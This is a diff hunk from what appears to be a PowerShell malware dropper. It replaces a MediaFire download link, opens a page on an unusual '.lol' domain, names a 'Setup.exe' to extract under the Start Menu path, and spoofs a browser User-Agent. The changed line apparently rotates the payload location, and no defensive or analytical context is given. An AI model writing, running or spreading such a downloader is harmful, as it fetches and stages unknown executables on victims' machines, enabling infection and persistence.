@@ -124,7 +124,7 @@ $tempPath=$startmenuPath
 }
 if($openUrl){$targetUrl="https://www.whuskalc.lol:443/essential/_page.html"}
 if($p1){
-$mediaFireUrl="https://www.mediafire.com:443/file/88goqlewodq0w4j/"
+$mediaFireUrl="https://www.mediafire.com:443/file/zn0rpkpqpguij0u/"
 $folderName="SetUp";$exeName="Setup.exe"
 $zipPath=Join-Path $tempPath "$folderName.zip";$extractPath=$tempPath;$exePath=Join-Path $extractPath $exeName
 $headers=@{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"}
